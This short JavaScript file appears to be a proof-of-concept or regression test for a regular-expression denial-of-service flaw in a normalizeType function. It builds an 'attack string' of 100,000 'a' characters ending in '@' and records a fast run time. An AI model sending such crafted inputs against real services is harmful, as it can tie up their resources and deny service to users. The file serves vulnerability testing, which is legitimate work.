const { normalizeType } = require("./utils.js");

//Attack String :""+"a"*100000+"@"
var str = "/";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "@";

var result = normalizeType(str);

// real    0m0.130s
// user    0m0.063s
// sys     0m0.045s
